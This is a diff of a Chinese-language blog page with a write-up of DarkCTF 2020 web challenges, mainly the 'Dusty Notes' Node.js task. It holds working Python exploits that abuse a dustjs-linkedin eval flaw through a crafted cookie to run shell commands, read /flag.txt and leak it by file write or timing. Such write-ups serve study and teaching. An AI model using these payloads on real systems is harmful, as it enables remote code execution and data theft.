@@ -465,7 +465,26 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <a id="more"></a>
 
 <h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><p>给了源码跟网页，主体上就是</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$web = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line"><span class="keyword">if</span> (is_numeric($web))&#123;</span><br><span class="line">      <span class="keyword">if</span> (strlen($web) &lt; <span class="number">4</span>)&#123;</span><br><span class="line">          <span class="keyword">if</span> ($web &gt; <span class="number">10000</span>)&#123;</span><br><span class="line">                 <span class="keyword">echo</span> (<span class="string">'&lt;div class="w3-panel w3-green"&gt;&lt;h3&gt;Correct&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;p&gt;darkCTF&#123;&#125;&lt;/p&gt;&lt;/div&gt;'</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                 <span class="keyword">echo</span> (<span class="string">'&lt;div class="w3-panel w3-red"&gt;&lt;h3&gt;Wrong!&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;p&gt;Ohhhhh!!! Very Close  &lt;/p&gt;&lt;/div&gt;'</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="keyword">echo</span> (<span class="string">'&lt;div class="w3-panel w3-red"&gt;&lt;h3&gt;Wrong!&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;p&gt;Nice!!! Near But Far&lt;/p&gt;&lt;/div&gt;'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">'&lt;div class="w3-panel w3-red"&gt;&lt;h3&gt;Wrong!&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;p&gt;Ahhhhh!!! Try Not Easy&lt;/p&gt;&lt;/div&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+$web = $_SERVER[&#39;HTTP_USER_AGENT&#39;];
+if (is_numeric($web)){
+      if (strlen($web) &lt; 4){
+          if ($web &gt; 10000){
+                 echo (&#39;&lt;div class=&quot;w3-panel w3-green&quot;&gt;&lt;h3&gt;Correct&lt;/h3&gt;
+  &lt;p&gt;darkCTF{}&lt;/p&gt;&lt;/div&gt;&#39;);
+          } else {
+                 echo (&#39;&lt;div class=&quot;w3-panel w3-red&quot;&gt;&lt;h3&gt;Wrong!&lt;/h3&gt;
+  &lt;p&gt;Ohhhhh!!! Very Close  &lt;/p&gt;&lt;/div&gt;&#39;);
+          }
+      } else {
+             echo (&#39;&lt;div class=&quot;w3-panel w3-red&quot;&gt;&lt;h3&gt;Wrong!&lt;/h3&gt;
+  &lt;p&gt;Nice!!! Near But Far&lt;/p&gt;&lt;/div&gt;&#39;);
+      }
+} else {
+    echo (&#39;&lt;div class=&quot;w3-panel w3-red&quot;&gt;&lt;h3&gt;Wrong!&lt;/h3&gt;
+  &lt;p&gt;Ahhhhh!!! Try Not Easy&lt;/p&gt;&lt;/div&gt;&#39;);
+}
+?&gt;</code></pre>
 <p>取UserAgent作为参数，判断了字符串长度与数值大小。简单使用科学计数法<code>9E9</code>即可绕过</p>
 <h2 id="Apache-Logs"><a href="#Apache-Logs" class="headerlink" title="Apache Logs"></a>Apache Logs</h2><p>给了个zip然后让你从里面的log文件里找flag.简单提取出其中String.fromCharCode部分放到浏览器console里转一下即可。不过提交时要用<code>darkCTF</code>而不是<code>DarkCTF</code></p>
 <h2 id="So-Simple"><a href="#So-Simple" class="headerlink" title="So_Simple"></a>So_Simple</h2><p>开始没啥头绪。后来发现提示了传参id.于是很简单就能发现是个sql注入。甚至基本上就是sqli-labs的第一关。union注入从users表中的password里找到某个flag.</p>
@@ -473,30 +492,62 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <h2 id="Dusty-Notes"><a href="#Dusty-Notes" class="headerlink" title="Dusty Notes"></a>Dusty Notes</h2><p><img src="/2020/09/25/DarkCTF-WEB/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>这题花了一些时间。不过做出来时拿了二血还是挺舒服的。看到Defenit是一血不知道是不是又被posix师傅秒掉了。（posix nodejs 永远的神）</p>
 <p>首先题目是黑盒测试的。这点对于一个nodejs题目来说增加了不少难度。如果是我出这题可能就直接给源码了。但是做完后我感觉这种设计还是很贴近现实的。也给了我一定程度上黑盒测nodejs的手段。</p>
 <p>首先题目大致实现了一个note功能。可以通过<code>addNotes</code>路由传参message。通过<code>deleteNote/{id}</code>来删除note.<br><img src="/2020/09/25/DarkCTF-WEB/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>不过简单看了下cookie发现内容可以由cookie控制</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;note</span><br><span class="line">j:[&#123;&quot;id&quot;:1,&quot;body&quot;:&quot;Hack this&quot;&#125;,&#123;&quot;id&quot;:2,&quot;body&quot;:&quot;1&quot;&#125;]</span><br></pre></td></tr></table></figure>
-<p>到这一步为止我有几种思路<br>1.nodejs反序列化。<br>2.原型链污染<br>3.？？？</p>
+<pre><code>//note
+j:[{&quot;id&quot;:1,&quot;body&quot;:&quot;Hack this&quot;},{&quot;id&quot;:2,&quot;body&quot;:&quot;1&quot;}]</code></pre><p>到这一步为止我有几种思路<br>1.nodejs反序列化。<br>2.原型链污染<br>3.？？？</p>
 <p>首先想到nodejs反序列化是因为以前NahamconCTF解出的一道node题。也是黑盒。然后只有20多解。但是我当时是抱着试一试的心态尝试了下反序列化居然成功拿到shell.后来发现，之所以会有这种想法就是因为:<br><strong>数据为json串。数据由cookie控制</strong><br>序列化输出的结果就是json串,所以黑盒下尝试node-serialize未尝不可。当然本题自然是失败了。因此方法也不再多说。</p>
 <p>第二种想法自然是因为nodejs中想要出现原型链污染实在是太容易了。不过有一说一一道以原型链污染为漏洞的ctf题使用公共靶机是非常不妥的，并且一般是给出源码进行测试。加上此处并没有什么显眼的模板使用比如ejs。因此是原型链污染的可能性也不大。</p>
 <p>此时基本上常规的思路已经走不通了。但是我简单fuzz了一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addNotes?note[]&#x3D;1</span><br><span class="line">addNotes?note[toString]&#x3D;1</span><br></pre></td></tr></table></figure>
-<p>发现它是没有做只能传字符串的限制的。一般来说，不对参数类型做限制时，我们可以传入数组或对象。因此在传入对象时这里会触发报错。<br>然后重点就来了，触发的报错内容如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;stack&quot;:&quot;TypeError: Cannot convert object to primitive value\n    at Tap.head (&#x2F;app&#x2F;node_modules&#x2F;dustjs-helpers&#x2F;lib&#x2F;dust-helpers.js:121:25)\n    at Tap.go (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:812:19)\n    at Chunk.write (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:556:19)\n    at Chunk.reference (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:611:19)\n    at body_4 (evalmachine.&lt;anonymous&gt;:1:1634)\n    at Chunk.render (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:598:12)\n    at Object.tap (&#x2F;app&#x2F;node_modules&#x2F;dustjs-helpers&#x2F;lib&#x2F;dust-helpers.js:123:8)\n    at Object.if (&#x2F;app&#x2F;node_modules&#x2F;dustjs-helpers&#x2F;lib&#x2F;dust-helpers.js:213:27)\n    at Chunk.helper (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:769:34)\n    at body_1 (evalmachine.&lt;anonymous&gt;:1:972)\n    at Chunk.section (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:654:21)\n    at body_0 (evalmachine.&lt;anonymous&gt;:1:847)\n    at &#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:122:11\n    at processTicksAndRejections (internal&#x2F;process&#x2F;task_queues.js:79:11)&quot;,&quot;message&quot;:&quot;Cannot convert object to primitive value&quot;&#125;</span><br></pre></td></tr></table></figure>
-<p>爆出了当前路径<code>/app</code>以及一个依赖<code>dustjs-linkedin/lib/dust.js</code><br>(这里多嘴一句，这里一开始defenit拿到一血后长达4个多小时都没有其他解，并且当时触发报错时题目只会爆500而不是像上面这样打印报错traceback,后来改了题才有了这个报错栈)</p>
+<pre><code>addNotes?note[]=1
+addNotes?note[toString]=1</code></pre><p>发现它是没有做只能传字符串的限制的。一般来说，不对参数类型做限制时，我们可以传入数组或对象。因此在传入对象时这里会触发报错。<br>然后重点就来了，触发的报错内容如下</p>
+<pre><code>{&quot;stack&quot;:&quot;TypeError: Cannot convert object to primitive value\n    at Tap.head (/app/node_modules/dustjs-helpers/lib/dust-helpers.js:121:25)\n    at Tap.go (/app/node_modules/dustjs-linkedin/lib/dust.js:812:19)\n    at Chunk.write (/app/node_modules/dustjs-linkedin/lib/dust.js:556:19)\n    at Chunk.reference (/app/node_modules/dustjs-linkedin/lib/dust.js:611:19)\n    at body_4 (evalmachine.&lt;anonymous&gt;:1:1634)\n    at Chunk.render (/app/node_modules/dustjs-linkedin/lib/dust.js:598:12)\n    at Object.tap (/app/node_modules/dustjs-helpers/lib/dust-helpers.js:123:8)\n    at Object.if (/app/node_modules/dustjs-helpers/lib/dust-helpers.js:213:27)\n    at Chunk.helper (/app/node_modules/dustjs-linkedin/lib/dust.js:769:34)\n    at body_1 (evalmachine.&lt;anonymous&gt;:1:972)\n    at Chunk.section (/app/node_modules/dustjs-linkedin/lib/dust.js:654:21)\n    at body_0 (evalmachine.&lt;anonymous&gt;:1:847)\n    at /app/node_modules/dustjs-linkedin/lib/dust.js:122:11\n    at processTicksAndRejections (internal/process/task_queues.js:79:11)&quot;,&quot;message&quot;:&quot;Cannot convert object to primitive value&quot;}</code></pre><p>爆出了当前路径<code>/app</code>以及一个依赖<code>dustjs-linkedin/lib/dust.js</code><br>(这里多嘴一句，这里一开始defenit拿到一血后长达4个多小时都没有其他解，并且当时触发报错时题目只会爆500而不是像上面这样打印报错traceback,后来改了题才有了这个报错栈)</p>
 <p>看到这个<code>dust</code>加上题目名中的dust，去搜索一波的话不难发现存在一个漏洞<br>并且有文章在实战中遇到解决<br><a href="https://artsploit.blogspot.com/2016/08/pprce2.html" target="_blank" rel="noopener">https://artsploit.blogspot.com/2016/08/pprce2.html</a></p>
 <p>简单说就是，dust的模板会进入一个if语句执行<code>eval</code>。但是如果我们直接传入参数时它会把敏感字符做处理，而如果传入数组时则不会处理敏感字符，即可rce。</p>
 <p>再多嘴一句，到确定是dust的洞这一步我本来以为弹个shell就完事了。结果测了好久发现不知道是不通外网还是没能执行。差点以为找错洞了。直到他改了题才发现dust依赖确认没找错洞，专心测下去的。<br>当然没有报错我们也有几种办法确认此处存在dust的eval漏洞<br>比如</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addNotes?message&#x3D;aaa%5C</span><br></pre></td></tr></table></figure>
-<p>会导致</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;&#39;xxx\&#39; &#x3D;&#x3D; &#39;desktop&#39;&quot;);</span><br></pre></td></tr></table></figure>
-<p>触发报错<br>再比如</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addNotes?message[]&#x3D;&amp;message[]&#x3D;y%27-console.log(7)</span><br></pre></td></tr></table></figure>
-<p>也会报错。因为我们此时引号没有被转义直接送入eval.触发报错。<br>所以，如果有着良好的FUZZ手段，黑盒也可以fuzz出问题并确认依赖错误。</p>
+<pre><code>addNotes?message=aaa%5C</code></pre><p>会导致</p>
+<pre><code>eval(&quot;&#39;xxx\&#39; == &#39;desktop&#39;&quot;);</code></pre><p>触发报错<br>再比如</p>
+<pre><code>addNotes?message[]=&amp;message[]=y%27-console.log(7)</code></pre><p>也会报错。因为我们此时引号没有被转义直接送入eval.触发报错。<br>所以，如果有着良好的FUZZ手段，黑盒也可以fuzz出问题并确认依赖错误。</p>
 <p>最后，我们使用eval语句命令执行。当然因为不通外网没有回显所以非常狗。我最后选择把结果写静态文件。并且这里静态目录是猜了一手<code>public</code>。所以可以直接写<code>/proc/self/cwd/public/css/style.css</code>或者在爆出是app目录后直接写<code>/app/public/css</code><br>exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">"http://dusty.darkarmy.xyz/"</span></span><br><span class="line">data=<span class="string">"""j:[&#123;"id":1,"body": ["1","1'-console.log(require('child_process').exec('cat /flag.txt &gt; /app/public/css/style.css').toString());//"]&#125;]"""</span></span><br><span class="line">print(quote(data))</span><br><span class="line">r=requests.get(url,cookies=&#123;<span class="string">'note'</span>:quote(data)&#125;)</span><br><span class="line">print(r.text)</span><br><span class="line">r=requests.get(url+<span class="string">'css/style.css'</span>)</span><br><span class="line">print(r.text)</span><br><span class="line">data=<span class="string">"""j:[&#123;"id":1,"body": ["1","1'-console.log(require('child_process').exec('rm /app/public/css/style.css').toString());//"]&#125;]"""</span></span><br><span class="line">print(quote(data))</span><br><span class="line">r=requests.get(url,cookies=&#123;<span class="string">'note'</span>:quote(data)&#125;)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">url=&quot;http://dusty.darkarmy.xyz/&quot;
+data=&quot;&quot;&quot;j:[{&quot;id&quot;:1,&quot;body&quot;: [&quot;1&quot;,&quot;1&#39;-console.log(require(&#39;child_process&#39;).exec(&#39;cat /flag.txt &gt; /app/public/css/style.css&#39;).toString());//&quot;]}]&quot;&quot;&quot;
+print(quote(data))
+r=requests.get(url,cookies={&#39;note&#39;:quote(data)})
+print(r.text)
+r=requests.get(url+&#39;css/style.css&#39;)
+print(r.text)
+data=&quot;&quot;&quot;j:[{&quot;id&quot;:1,&quot;body&quot;: [&quot;1&quot;,&quot;1&#39;-console.log(require(&#39;child_process&#39;).exec(&#39;rm /app/public/css/style.css&#39;).toString());//&quot;]}]&quot;&quot;&quot;
+print(quote(data))
+r=requests.get(url,cookies={&#39;note&#39;:quote(data)})</code></pre>
 <p>cookie可控所有内容上面说过了。只不过测试时因为路由好用就没控cookie.</p>
 <p>做出来后问了下出题人果然不是预期。当然这里我不太确定预期是啥，不过差的应该不多。当然聊完后出题人顺手修了下写文件的权限 :）<br>然后就是这种做法我自己也不是很喜欢。自己出过的nodejs题目在可以rce的情况下我都把工作目录按root权限设置。就是为了防止写文件。不过一般会配置了防止时间盲注，所以都会给出rce的回显</p>
 <p>所以这里猜一手本题预期的方法是time-based-rce:<br>exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote,unquote</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://dusty.darkarmy.xyz/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">js_exp</span><span class="params">(str1)</span>:</span></span><br><span class="line">    x=[]</span><br><span class="line">    str1 = str1.strip(<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> str1:</span><br><span class="line">        x.append(str(ord(ch)))</span><br><span class="line">    t=<span class="string">','</span>.join(x)</span><br><span class="line">    result=<span class="string">'eval(String.fromCharCode('</span>+t+<span class="string">'))'</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(num)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">        cmd = <span class="string">"""require('child_process').execSync(`if [ $(cat /flag.txt | cut -c &#123;&#125;) = '&#123;&#125;' ];then sleep 3;fi`)"""</span>.format(num,i)</span><br><span class="line">        payload = js_exp(cmd)</span><br><span class="line">        data = <span class="string">"""j:[&#123;"id":1,"body": ["1","1'-"""</span> + payload + <span class="string">""";//"]&#125;]"""</span></span><br><span class="line">        t = time.time()</span><br><span class="line">        r = requests.get(url, cookies=&#123;<span class="string">'note'</span>: quote(data)&#125;)</span><br><span class="line">        <span class="keyword">if</span> time.time() - t &gt; <span class="number">3</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">import time
+import requests
+from urllib.parse import quote,unquote
+import string
+
+url=&quot;http://dusty.darkarmy.xyz/&quot;
+
+def js_exp(str1):
+    x=[]
+    str1 = str1.strip(&#39; &#39;)
+    for ch in str1:
+        x.append(str(ord(ch)))
+    t=&#39;,&#39;.join(x)
+    result=&#39;eval(String.fromCharCode(&#39;+t+&#39;))&#39;
+    return result
+flag=&quot;&quot;
+for num in range(1,50):
+    print(num)
+    for i in string.printable:
+        cmd = &quot;&quot;&quot;require(&#39;child_process&#39;).execSync(`if [ $(cat /flag.txt | cut -c {}) = &#39;{}&#39; ];then sleep 3;fi`)&quot;&quot;&quot;.format(num,i)
+        payload = js_exp(cmd)
+        data = &quot;&quot;&quot;j:[{&quot;id&quot;:1,&quot;body&quot;: [&quot;1&quot;,&quot;1&#39;-&quot;&quot;&quot; + payload + &quot;&quot;&quot;;//&quot;]}]&quot;&quot;&quot;
+        t = time.time()
+        r = requests.get(url, cookies={&#39;note&#39;: quote(data)})
+        if time.time() - t &gt; 3:
+            flag += i
+            print(flag)
+            break</code></pre>
 <p>flag:<br><code>darkCTF{n0d3js_l1br4r13s_go3s_brrrr!}</code></p>
 <p>因为一些格式原因。我把payload用eval转化了一下，这样看起来更舒服一些.并且不用担心奇奇怪怪的引号问题 :)</p>
 <p>不过题目我觉得很有启发性，主要是给了我一些面对nodejs黑盒处理的手段。那就是利用其容易报错的特性进行FUZZ，得到目录这样的关键信息，或者是依赖的关键信息。同时一定程度上可以推测语句，甚至不需要知道依赖漏洞的细节就能直接上手。</p>
@@ -709,7 +760,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -721,9 +772,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -856,6 +907,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1069,7 +1122,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1125,6 +1178,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
